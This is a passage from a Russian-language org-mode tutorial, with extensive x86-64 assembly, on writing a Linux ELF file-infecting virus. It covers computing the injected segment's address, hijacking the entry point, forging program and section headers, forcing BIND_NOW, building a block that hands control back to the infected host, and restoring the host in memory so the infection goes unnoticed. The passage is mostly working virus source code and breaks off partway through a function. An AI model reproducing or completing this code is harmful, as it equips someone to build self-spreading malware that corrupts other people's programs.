Дело в том, что нам нужно, чтоб наш загрузчик счел загружаемый сегмент
кода, в котором будет наша новая точка входа, валидным. В противном
случае он его просто не загрузит.
Валидный адрес считается следующим образом:

- берем адрес предыдущего сегмента -  в нашем случае это последний
  загружаемый сегмент  - и выравниваем его по 4 кб
- затем берем выравнивание этого сегмента и прибавляем его к полученному
  адресу
- а теперь прибавляем к полученному адресу смещение в файле, на котором
  будет находиться вирус

Выглядеть это будет так:
Предположим, у последнего сегмента адрес ~0х600е10~, выранивание
~0x200000~, а смещение вируса в инфицированной жертве, к примеру, ~0х594а~.

Выравниваем ~0x600e10~, получили ~0x600000~. А дальше простая арифметика:
~600000 + 200000 + 594a = 80594a~.
Поскольку мы соблюдаем условие "валиности" сегмента (виртуальнаый
адрес - смещение в файле =  адрес, выровненый по размеру страницы
памяти), то загрузчик без проблем загрузит этот сегмент.

Так что высчитываем виртуальный адрес для вируса именно таким образом.
Смещение в файле для вируса высчитывается просто: старое смещение
заголовков секций (вирус встанет на их место в файле) + 56 байт
(учитываем новый заголовок) + содержимое переменной
~new_bind_now_flag_record_size~ (учитываем возможное расширение секции ~dynamic~)

#+NAME: _count_virus_new_vaddr
#+BEGIN_SRC asm
  /// _COUNT_VIRUS_NEW_VADDR
  /// Считает виртуальный адрес вируса внутри
  /// инфицированной жертвы
  /// Адрес считается как
  /// vaddr последнего загружаемого сегмента кода жертвы +
  /// ее выравнивание + смещение до кода вируса в файле
  _count_virus_new_vaddr:
      push    %rbx
      push    %rcx

      mov     last_seg_vaddr(%rip), %rax
      test    %rax, %rax
      je      _count_virus_new_vaddr_fail

      mov    	last_seg_allign(%rip), %rbx

      and     $~0xFFF, %rax
      add     %rbx, %rax

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _count_virus_new_vaddr_fail

      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      add     %rbx, %rax

      mov     %rax, virus_new_vaddr(%rip)

  _count_virus_new_vaddr_success:
      xor     %rax, %rax
      jmp     _count_virus_new_vaddr_exit

  _count_virus_new_vaddr_fail:
      mov      $-1, %rax

  _count_virus_new_vaddr_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Теперь можно отредактировать заголовок эльфа.
Нам нужно:
- отредактировать новую точку входа - ею станет высчитанный выше
  виртуальный адрес вируса - и сохранить оригинальную точку входа (нам
  она понадобится, что вернуть на этот адрес управление)
- увеличить количество заголовков секций и сегментов
- пересчитать смещение в файле таблицы заголовков секций.
Оно считается как  старое смещение + размер вируса + 56 байт + содержимое
переменной ~new_bind_now_flag_record_size~ + размер блока данных.

#+NAME: _edit_elf_hdr
#+BEGIN_SRC asm
  /// _EDIT_ELF_HDR
  /// Редактирует заголовок эльфа
  /// и сохраняет его оргинальный e_entry
  _edit_elf_hdr:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     virus_code_size(%rip), %rsi
      test    %rsi, %rsi
      je      _edit_elf_hdr_fail

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _edit_elf_hdr_fail

      mov     virus_new_vaddr(%rip), %rdx
      test    %rdx, %rdx
      je      _edit_elf_hdr_fail

      mov     data_size(%rip), %rcx
      mov     new_bind_now_flag_record_size(%rip), %rdx

      add     %rcx, %rsi  # + размер блока данных
      add     $0x38, %rsi # + размер вставляемого заголовка
      add     %rdx, %rsi  # + размер вставляемой записи dynamic

      add     $0x18, %rdi     # смещение до e_entry

      mov     (%rdi), %rcx
      mov     %rcx, original_e_entry(%rip) # save original e_entry

      mov     virus_new_vaddr(%rip), %rdx
      mov     %rdx, (%rdi)  # new e_entry

      add     $0x10, %rdi   # смещение до e_shoff
      add     %rsi, (%rdi)

      add     $0x10, %rdi   # смещение до e_phnum
      add     $0x1, (%rdi)

      add     $0x4, %rdi    # смещение до e_shnum
      add     $0x1, (%rdi)

  _edit_elf_hdr_success:
      xor     %rax, %rax
      jmp     _edit_elf_hdr_exit

  _edit_elf_hdr_fail:
      mov     $-1, %rax

  _edit_elf_hdr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      pop    %rcx
      ret

#+END_SRC

*** Генерируем заголовки для вируса и другую информацию

Это относительно несложный этап.
Нам нужно сгенерировать следующее:
- запись ~BIND_NOW~, если в этом есть необходимость
- заголовок сегмента и заголовок секции вируса
- блок передачи управления
- блок с данными жертвы

Если первые два пункта еще более-менее понятны и освещались ранее, что
про последние два пока речь не зоходила.

Как понятно из контакста, в инфицированном файле сначала запускается
вирус, а затем должна запуститься жертва. Передать на нее управлени можно
с помощью косвенного ~jmp~, для этого нужно просто высчитать смещение от
адреса, следующего за прыжком, до оригинальноой точки входа не зря же мы
ее сохраняли). Все это уместится в 5 байт: ~e9 смещение~.

А еще мы договорились, что жертву придется в памяти
сдвигать. Следовательно, нам надо как-то вызвать функционал, который ее
сдвинет, и сделает это только в том случае, если вирус будет исполняться
внутри инфицированного файла - в своем родном файле ему двигать нечего.
Так что нам нужно сгенерировать еще 5 байт: ~e8 смещение~, где ~e8~ - это
машкод операции ~call~,  а смещение - это смещение от следующей за ~call~
команды до функции, которая сдвинет жертву.

Из этих двух маленьких кусочков и будет состоять блок передачи
управления.

Блок с данными жертвы нам нужен, что ее сдвинуть.
Дело в том, что когда вирус исполняется из инфицированного файла, он
снова ничего о нем не знает. Конечно, когда мы вписывали код вируса в
жертву, переменные хранили в себе все ее значения - мы ж ее сначала
распарсили.
Но к тому моменту, как мы соберемся передавать управление жертве,
вирус уже распарсит следующую жертву, и данные в переменных будут неактуальными.

Для этого мы создадим буфер, в который запишем необходимые данные для
"сдвига" жертвы, который впишем после всего кода вируса.

Фактически все эти операции представляют собой просто заполнение
выделенной памяти.

Начнем с создания заголовка сегмента вируса.
Он будет иметь следующую структуру:

- 56 байт
- ~p_type~ - 4 байт, value 1 - PL_LOAD
- ~p_flags~ - 4 байта, value 1 - разрешение на исполнение
- ~p_offset~ - 8 байт, смещение вируса в файле
- ~p_vaddr~ - 8 байт, виртуальный адрес вируса
- ~p_paddr~ - аналогично ~p_vaddr~
- ~p_filesz~ - 8 байт, размер вируса в файле (~_global_exit~ - ~_start~)
- ~p_memsz~ - 8 байт, размер вируса в памяти (аналогичен ~p_filesz~)
- ~p_allign~ - 8 байт, - значение 0, выравнивание не требуется

#+NAME: _generate_virus_phdr
#+BEGIN_SRC asm
  /// _GENERATE_VIRUS_PHDR
  /// генерирует заголовок сегмента для кода вируса
  _generate_virus_phdr:
      push    %rbx
      push    %rcx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_phdr(%rip), %rax

      movb    $0x1, (%rax) # p_type
      add     $0x4, %rax

      movb    $0x5, (%rax) # p_flags
      add     $0x4, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      movq    %rbx, (%rax) # p_offset
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip),%rbx
      movq    %rbx, (%rax) # vaddr
      add     $0x8, %rax

      movq    %rbx, (%rax) # paddr
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx
      movq    %rbx, (%rax) # p_filesz

      // к размеру кода добавили блок данных жертвы
      mov     data_size(%rip), %rcx
      add     %rcx, (%rax)

      add     $0x8, %rax

      movq    %rbx, (%rax) # p_memsz
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поле p_allign при инициализации
      # заполнено нулями, что и нужно
  _generate_virus_phdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_phdr_exit
  _generate_virus_phdr_fail:
      mov     $-1, %rax

  _generate_virus_phdr_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Теперь создадим заголовок секции вируса.

- 64 байтa
- ~sh_name~ - 4 байта, значение - индекс в таблице строк, где строка - это
  имя секции.
- ~sh_type~ - 4 байта, тип секции 1 (PROGBITS) - значение секции определяется
  и используется программой единолично
- ~sh_flags~ - 8 байт, value 4 - разрешение на исполнение
- ~sh_addr~ - 8 байт, виртуальный адрес вируса,
- ~sh_offset~ - 8 байт, смещение вируса в файле
- ~sh_size~ - 8 байт, размер вируса в файле
- ~sh_link~ - 8 байт, значение - 0
- ~sh_info~ - 8 байт, значение 0
- ~sh_addralign~ - 8 байт, - значение 0, выравнивание не требуется
- ~sh_entsize~ - 8 байт, - значение 0, код не содержит никаких записей
  фиксированного размера

#+NAME: _generate_virus_shdr
#+BEGIN_SRC asm
  /// _GENERATE_VIRUS_SHDR
  /// генерирует заголовок секции для кода вируса
  _generate_virus_shdr:
      push    %rbx

      mov      virus_new_vaddr(%rip),%rbx
      test     %rbx, %rbx
      je      _generate_virus_phdr_fail

      leaq    virus_new_shdr(%rip), %rax
      leaq    sh_name_indx(%rip), %rbx

      movl    (%rbx), %ebx  # sh_name
      movl    %ebx,  (%rax)
      add     $0x4, %rax

      movb    $0x1, (%rax)  # sh_type
      add     $0x4, %rax

      movb    $0x6, (%rax)  # sh_flags
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip), %rbx
      mov     %rbx, (%rax)  # sh_addr
      add     $0x8, %rax

      mov     victim_elf_addr(%rip), %rbx
      mov     ELF_E_SHOFF(%rbx), %rbx
      add     $0x38, %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      mov     %rbx, (%rax)  # sh_offset
      add     $0x8, %rax

      mov     virus_code_size(%rip), %rbx

      mov     data_size(%rip), %rcx

      mov     %rbx, (%rax) # sh_size
      add     %rcx, (%rax)

      add     $0x8, %rax

      # поля sh_link, sh_info, sh_addralign, sh_entsize
      # при инициализации записаны нулями,
      # а нам и нужно чтоб они были
      # заполнены нулями
  _generate_virus_shdr_success:
      xor     %rax, %rax
      jmp     _generate_virus_shdr_exit

  _generate_virus_shdr_fail:
      mov     $-1, %rax

  _generate_virus_shdr_exit:
      pop     %rbx
      ret

#+END_SRC

Создать запись ~BIND_NOW~ совсем просто: нужно просто взять 16 байт и в
первый 8 байт положить число ~0x18~ - это тип ~BIND_NOW~.

#+NAME: _generate_bind_now_flag_record
#+BEGIN_SRC asm
  /// GENERATE_BIND_NOW_FLAG_RECORD
  /// Создает запись для флага BIND_NOW
  _generate_bind_now_flag_record:
      mov     new_bind_now_flag_record_size(%rip), %rax
      test    %rax, %rax
      je      _generate_bind_now_flag_record_fail

      leaq    bind_now_flag_record(%rip), %rax
      movb    $0x18, (%rax)

  _generate_bind_now_flag_record_success:
      xor     %rax, %rax
      jmp     _generate_bind_now_flag_record_exit

  _generate_bind_now_flag_record_fail:
      mov     $-1, %rax

  _generate_bind_now_flag_record_exit:
      ret

#+END_SRC

Чтоб создать блок передачи управления, нам нужно высчитать смещения.
Сначала посчитаем смещение от условного ~jmp~ до оригинальной точки
входа.

#+NAME: _count_offset_to_orig_e_entry
#+BEGIN_SRC asm
  /// _COUNT_OFFSET_TO_ORIG_E_ENTRY
  /// считает смещение до оригинльного e_entry,
  /// чтоб его мог использовать jmp, который передаст
  /// управление жертве после того,
  /// как вирус в ней отработает
  _count_offset_to_orig_e_entry:
      push   %rbx
      push   %rcx

      // проверяем данные
      mov     virus_code_size(%rip), %rax
      test    %rax, %rax
      je      _count_offset_to_orig_e_entry_fail

      mov     original_e_entry(%rip), %rbx
      test    %rbx, %rbx
      je      _count_offset_to_orig_e_entry_fail

      mov     virus_new_vaddr(%rip), %rcx
      test    %rcx, %rcx
      je      _count_offset_to_orig_e_entry_fail

      // считаем адрес, на котором будем находиться,
      // когда будем передавать управление жертве
      dec     %rax
      add     %rcx, %rax
      mov     %rax, %rdi

      // после исполнения вируса новая запись в dynamic
      // будет затерта, поэтому считаем смещение так,
      // как-будто ее нет
      mov    new_bind_now_flag_record_size(%rip), %rcx
      sub    %rcx, %rdi
      // посчитали смещение,
      // должно быть отрицательным, поскольку
      // оригинальный e_entry всегда будет выше
      // _global_exit
      sub    %rax, %rbx
      movl   %ebx, offset_to_e_entry(%rip)

  _count_offset_to_orig_e_entry_success:
      xor     %rax, %rax
      jmp     _count_offset_to_orig_e_entry_exit

  _count_offset_to_orig_e_entry_fail:
      mov     $-1, %rax

  _count_offset_to_orig_e_entry_exit:
      pop    %rcx
      pop    %rbx
      ret

#+END_SRC

А теперь посчитаемсмещение от ~call~ до функции ~move_victim~, которая
сдвинет жертву.

#+NAME: _count_offset_to_move_victim
#+BEGIN_SRC asm
  /// _COUNT_OFFSET_TO_MOVE_VICTIM
  /// считает смещение до функции move_victim
  /// всегда возвращает true
  _count_offset_to_move_victim:
      push   %rbx

      leaq    _move_victim(%rip), %rbx
      leaq    _global_exit(%rip), %rax
      add     $0x5, %rax  # пропустили будущую команду jmp

      sub     %rax, %rbx
      movl    %ebx, move_victim_offset(%rip)

      xor     %rax, %rax
      pop     %rbx
      ret
#+END_SRC

Теперь можно создать блок передачи управления.

#+NAME: _transfer_control_to_victim
#+BEGIN_SRC asm
  /// _TRANSFER_CONTROL_TO_VICTIM
  /// создает блок кода для передачи
  /// управления на жертву - записывает опкоды
  /// операций и необходимые смещения
  transfer_control_code_size:
      .quad  0xB

  transfer_control_code:
      .space  0xB, 0

  _transfer_control_to_victim:
      push    %rbx

      lea     transfer_control_code(%rip), %rax
      mov     $0xe8, %rbx
      movzwl  %bx, %ebx

      // call opcode
      movb    %bl, (%rax)
      inc     %rax

      // offset
      mov     move_victim_offset(%rip), %rbx
      test    %rbx, %rbx
      je      _transfer_control_to_victim_fail

      mov     %ebx, (%rax)
      add     $0x4, %rax

      mov     $0xe9, %rbx
      movzwl  %bx, %ebx

      // call opcode
      movb    %bl, (%rax)
      inc     %rax

      mov     offset_to_e_entry(%rip), %rbx
      test    %rbx, %rbx
      je      _transfer_control_to_victim_fail

      mov     %ebx, (%rax)
      add     $0x4, %rax

      // nop opcode
      mov     $0x90, %rbx
      movzwl  %bx, %ebx
      movb    %bl, (%rax)

  _transfer_control_to_victim_success:
      xor     %rax, %rax
      jmp     _transfer_control_to_victim_exit

  _transfer_control_to_victim_fail:
      mov     $-1, %rax

  _transfer_control_to_victim_exit:
      pop     %rbx
      ret

#+END_SRC

Ну и последний штрих - это блок данных жертвы, которые нам необходимы для
ее "сдвига".
Нам нужны:
- новая точка входа - виртуальный адрес вируса
- смещение от начала файла до оригинальное точки входа (так мы сможем
  найти начало файла в памяти)
- оригинальная точка входа
- смещение от оригинальной точки входа до новой точки входа
- смещение кода жертвы - он идет после заголовков сегментов - от начала
  файла
- значение ~new_bind_now_flag_record_size~
- и данные секции ~dynamic~ (если есть): виртуальный адрес, размер и
  смещение - если секция была отредактирована, нам надо вернуть ей
  исходное состояние.
- виртуальный адрес первого сегмента кода (это позволит нам вычислять
  соотношение между сегментами кода в памяти процесса)

 Все эти значения хранятся в переменных. Большинство из них взяты из
 заголовков жертвы или высчитаны с использованием данных из них.
 Только надо помнить, что у нас все сместится минимум на 56 байт, а
 следовательно, нельзя просто бездумно переписать данные из переменных в
 буфер - где-то придется увеличить значение на 56 байт и т.д.

Так же мы помним про принцип, что одна функция делает ровно 1 вещь и
исполняется только в одном конкретном случае. Поскольку у нас может не
быть секции ~dynamic~ - а это предполагает наличие проверки и ветвления -
то мы создадим 2 функции, которые будут создавать блок данных. Одна в
случае, если секция ~dynamic~ есть, другая  - если ее нет.

При этом размер блока не поменятся.

Посчитаем недостающие смещения.
Сначала от начала файла до оригинальной точки входа.
#+NAME: _count_offset_to_e_entry_frm_file_begin
#+BEGIN_SRC asm
  /// _COUNT_OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN
  /// считаем смещение от начала файла до оригинального
  /// e_entry
  _count_offset_to_e_entry_frm_file_begin:
      push    %rsi
      push    %rdx

      mov     first_seg_vaddr(%rip), %rsi
      // test    %rsi, %rsi
      // je      _count_offset_to_e_entry_frm_file_begin_fail

      mov     original_e_entry(%rip), %rdx
      test    %rdx, %rdx
      je      _count_offset_to_e_entry_frm_file_begin_fail

      sub     %rsi, %rdx
      mov     %rdx, offset_to_e_entry_frm_file_begin(%rip)

  _count_offset_to_e_entry_frm_file_begin_success:
      xor     %rax, %rax
      jmp     _count_offset_to_e_entry_frm_file_begin_exit

  _count_offset_to_e_entry_frm_file_begin_fail:
      mov      $-1, %rax

  _count_offset_to_e_entry_frm_file_begin_exit:
      pop     %rdx
      pop     %rsi

      ret

#+END_SRC

Теперь от оригинальной точки входа до новой точки входа.
#+NAME: _count_frm_orig_e_entry_to_virus_e_entry_offset
#+BEGIN_SRC asm
  ///_COUNT_FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET
  /// считает смещение от нового e_entry
  /// до оригинального
  _count_frm_orig_e_entry_to_virus_e_entry_offset:
      push    %rcx
      push    %rdx

      mov     virus_new_vaddr(%rip), %rcx
      test    %rcx, %rcx
      je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

      mov     original_e_entry(%rip), %rdx
      test    %rdx, %rdx
      je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

      sub     %rdx, %rcx
      mov     %rcx, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

  _count_frm_orig_e_entry_to_virus_e_entry_offset_success:
      xor     %rax, %rax
      jmp     _count_frm_orig_e_entry_to_virus_e_entry_offset_exit

  _count_frm_orig_e_entry_to_virus_e_entry_offset_fail:
      mov      $-1, %rax

  _count_frm_orig_e_entry_to_virus_e_entry_offset_exit:
      pop     %rdx
      pop     %rcx

      ret

#+END_SRC

Теперь напишем функцию, которая заполняет блок данных в случае, если
секции ~dynamic~ нет.
#+NAME:  _make_victim_data_block_without_dynamic_data
#+BEGIN_SRC asm
  /// _MAKE_VICTIM_DATA_BLOCK_WITHOUT_DYNAMIC_DATA
  /// создает блок с данными жертвы в случае,
  /// если секции dynamic НЕТ
  _make_victim_data_block_without_dynamic_data:
      push    %rbx
      push    %rcx

      // если секция dynamic есть,
      // этот блоккода не подходит
      mov     dynamic_records_vaddr(%rip), %rbx
      test    %rbx, %rbx
      jne     _make_victim_data_block_without_dynamic_data_fail

      // иначе начинаем записывать данные, проверяя
      // наличие критически важных
      leaq    data_block(%rip), %rax

      mov     first_seg_vaddr(%rip), %rbx

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_without_dynamic_data_fail

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_without_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     original_e_entry(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_without_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_without_dynamic_data_fail

      sub     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     victim_code_offset(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_without_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     new_bind_now_flag_record_size(%rip), %rbx
      movq    %rbx, (%rax)

      xor     %rax, %rax
      jmp     _make_victim_data_block_without_dynamic_data_exit
  _make_victim_data_block_without_dynamic_data_fail:
      mov     $-1, %rax

  _make_victim_data_block_without_dynamic_data_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

И аналогичная функция на случай, если секция ~dynamic~ есть.

#+NAME: _make_victim_data_block_with_dynamic_data
#+BEGIN_SRC asm
  /// _MAKE_VICTIM_DATA_BLOCK_WITH_DYNAMIC_DATA
  /// создает блок с данными жертвы в случае,
  /// если секция dynamic ЕСТЬ
  _make_victim_data_block_with_dynamic_data:
      push    %rbx
      push    %rcx

      // если секции dynamic нет,
      // этот блок кода не подходит
      mov     dynamic_records_vaddr(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_with_dynamic_data_fail

      // иначе начинаем записывать данные, проверяя
      // наличие критически важных
      leaq    data_block(%rip), %rax

      mov     first_seg_vaddr(%rip), %rbx

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     virus_new_vaddr(%rip), %rbx
      test    %rbx, %rbx
      je      _make_victim_data_block_with_dynamic_data_fail

      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_with_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     original_e_entry(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_with_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
      test    %rbx, %rbx
      je     _make_victim_data_block_with_dynamic_data_fail

      sub     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     victim_code_offset(%rip), %rbx
      test     %rbx, %rbx
      je     _make_victim_data_block_with_dynamic_data_fail

      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     new_bind_now_flag_record_size(%rip), %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_vaddr(%rip), %rbx
      add     $0x38, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_size(%rip), %rbx
      mov     new_bind_now_flag_record_size(%rip), %rcx
      add     %rcx, %rbx
      movq    %rbx, (%rax)
      add     $0x8, %rax

      mov     dynamic_records_offset(%rip), %rbx
      add     $0x38, %rbx
      movq    %rbx, (%rax)

      xor     %rax, %rax
      jmp     _make_victim_data_block_with_dynamic_data_exit

  _make_victim_data_block_with_dynamic_data_fail:
      mov     $-1, %rax

  _make_victim_data_block_with_dynamic_data_exit:
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

И вот теперь можно все это собрать в один алгоритм, который пересчитает и
сгенерирует все необходимые данные для заражения.

В случае, если на каком-то этапе произойдет фэйл, ~recount_victim~ вернет
-1, и вирус завершится.

#+NAME: _recount_victim
#+BEGIN_SRC asm
  /// _RECOUNT_VICTIM
  /// Пересчитывает данные жертвы
  _recount_victim:
      call    _recount_symbols_addrs
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _recount_rela_sections
      test    %rax, %rax
      jne     _recount_hdrs

  _recount_hdrs:
      call    _shdr_offset_and_addr_recount
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _phdr_offset_and_addr_recount
      test    %rax, %rax
      jne     _recount_victim_fail

  _recount_dynamic_and_got:
      call    _recount_dynamic_section
      test    %rax, %rax
      jne     _generate_virus_data

      call    _recount_got_section

  _generate_virus_data:
      call    _count_virus_new_vaddr
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _generate_virus_phdr
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _generate_virus_shdr
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _generate_bind_now_flag_record

  _recount_elf_hdr:
      call    _edit_elf_hdr
      test    %rax, %rax
      jne     _recount_victim_fail

  _count_offsets:
      call    _count_offset_to_orig_e_entry
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _count_offset_to_move_victim
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _count_offset_to_e_entry_frm_file_begin
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _count_frm_orig_e_entry_to_virus_e_entry_offset
      test    %rax, %rax
      jne     _recount_victim_fail

  _make_opcode_blocks:
      call    _transfer_control_to_victim
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _make_victim_data_block_with_dynamic_data
      test    %rax, %rax
      je     _recount_victim_success

      call    _make_victim_data_block_without_dynamic_data
      test    %rax, %rax
      jne     _recount_victim_fail

  _recount_victim_success:
      movq    $0, recount_success(%rip)
      xor     %rax, %rax
      jmp     _recount_victim_exit

  _recount_victim_fail:
      mov      $-1, %rax

  _recount_victim_exit:
      ret

#+END_SRC

*** Передвинуть жертву

Я неоднократно упоминал о "сдвиге" жертвы в памяти процесса, чтоб она и
не заметила, что была когда-то заражена.

В принципе, это несложно сделать: нам нужно пересчитать "обратно" секцию
~dynamic~, а затем просто сдвинуть каждый байт жертвы на 56 байт вверх,
если он находится до секции ~dynamic~ и на 56 байт + содержимое
~new_bind_now_flag_record_size~, если он ниже секци ~dynamic~.

Но и здесь есть свои подводные камни.
Во-первых, как уже упоминалось ранее, мы не можем писать прямо в код по
умолчанию. А "передвижение" жертвы - это перезапись ее кода из одного
места, в другое. Если не вызвать ~mprotect~, то попытка ее подвинуть
выовет сегфолт.

Во-вторых, мы не можем вызвать ~mprotect~ для всей жертвы сразу: ее код
находится на разных страницах памяти, это огромный объем памяти. К тому
же, выравнивание придумали не просто так - мы с этими байтами не можем
делать вообще ничего. Поэтому даже если ~mprotect~ сработает, мы не
сможем сдвинуть выравнивание.

Ну и вишенка на торте. Помните, я говорил, что линкер хитрый и считывает
себе адреса записей ~dynamic~ в буфер? Так вот, даже отказ от ленивого
связывания не спасает нас от этой проблемы: сишной программе по-прежнему
нужно завершиться. А завершается она с помощью ~libc~,  которая вызывает
определенные секции кода из жертвы - секцию ~fini~, например. Как вы
думаете, как она находит эти секции?

Правильно. Она отправляется в буфер, который создал линкер, берет оттуда
адрес записи, которая каается секции ~fini~ из секции ~dynamic~, затем по
этому адресу обращается к записи и уже из нее получает адрес нужной
секции.
В результате у нас новая пробелма: нам нужно отредактировать все адреса в
секции ~dynamic~ так, чтоб они приняли прежний вид - мы же все сдвинем
обратно - а с другой стороны, нам вообще нельзя двигать секцию
~dynamic~, потому что иначе ~libc~ получит не те адреса.

Но решение у этого есть. К счастью, необходимые записи для ~libc~
находятся в начале секции ~dynamic~. Это значит, что мы можем спокойно
сдвинуть все, что находится ниже секции, не трогая ее саму. Таким образом
мы просто затрем уже ненужные записи.

Давайте посмотрим, как будет выглядеть жертва в памяти процесса до и
после сдвига.

Мы предполагаем, что у нас какой-то совсем маленький файл жертвы, он
использует динамическую линковку и изначально использовал "ленивое"
связывание, а мы изменили его на "связать здесь и сейчас" - т.е. добавили
запись ~BIND_NOW~.

#+NAME: victim_before_move_pic
#+BEGIN_SRC ditaa :file ./img/infected_victim_before_move.png
  +------------------+-----------------------------------------------------+
  | 0x400000         |             ЗAГОЛОВОК ELF-ФАЙЛА                     |
  +------------------+-----------------------------------------------------+
  | 0x400040         |        ТАБЛИЦА ЗАГОЛОВКОВ СЕГМЕНТОВ                 |
  +------------------+-----------------------------------------------------+
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  |                  |                                                     |
  +------------------+-----------------------------------------------------+
#+END_SRC

#+results: victim_before_move_pic
[[file:./img/infected_victim_before_move.png]]

Сначала мы вытащим все данные сдвигаемой жертвы из буфера данных, куда мы
их положили, и рассуем их по переменным для удобства.

#+NAME: _get_move_victim_data
#+BEGIN_SRC asm
  /// _GET_MOVE_VICTIM_DATA
  /// выгружает данные жертвы из блока данных
  /// в переменные
  _get_move_victim_data:
      push    %rdi

      leaq    _global_exit(%rip), %rdi
      test    %rdi, %rdi
      je      _get_move_victim_data_fail

      mov     NEW_BIND_NOW_FLAG_RECORD_SIZE(%rdi), %rax
      mov     %rax, new_bind_now_flag_record_size(%rip)

      mov     FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY(%rdi), %rax
      mov     %rax, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

      mov     OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN(%rdi), %rax
      mov     %rax, offset_to_e_entry_frm_file_begin(%rip)

      mov     FIRST_SEGM_VADDR(%rdi), %rax
      mov     %rax, first_seg_vaddr(%rip)

      mov     DYNAMIC_REC_VADDR(%rdi), %rax
      mov     %rax, dynamic_records_vaddr(%rip)

      mov     DYNAMIC_RECORDS_OFFSET(%rdi), %rax
      mov     %rax, dynamic_records_offset(%rip)

      mov     DYNAMIC_REC_SZ(%rdi), %rax
      mov     %rax, dynamic_records_size(%rip)

      mov     VICTIM_CODE_OFFSET(%rdi), %rax
      mov     %rax, victim_code_offset(%rip)

      mov     first_seg_vaddr(%rip), %rax
      mov     victim_code_offset(%rip), %rdi
      add     %rdi, %rax
      mov     %rax, victim_code_frm_begin_vaddr(%rip)

      movq    $-0x38, constant_value(%rip)

  _get_move_victim_data_success:
      xor     %rax, %rax
      jmp     _get_move_victim_data_exit

  _get_move_victim_data_fail:
      mov     $-1, %rax

  _get_move_victim_data_exit:
      pop     %rdi
      ret

#+END_SRC

Теперь нам нужно посчитать базовый адрес эльфа. Нам же нужно добраться до
его заголовков, чтоб вызвать ~mprotect~ для каждого сегмента программы.

Сделать это не трудно: виртуальный адрес вируса - наша новая точка
входа - и вычитаем из нее смещение до оригинальной точки входа, а затем
смещение от оригинальной точки входа до начала файла.

#+NAME: _count_begin_elf_addr_in_memory
#+BEGIN_SRC asm
  // _COUNT_BEGIN_ELF_ADDR_IN_MEMORY
  // Считает адрес, по которому лежит
  // инфицированный исполняющийся эльф
  _count_begin_elf_addr_in_memory:
      push    %rdi
      push    %rsi

      mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rsi
      test    %rsi, %rsi
      je      _count_begin_elf_addr_in_memory_fail

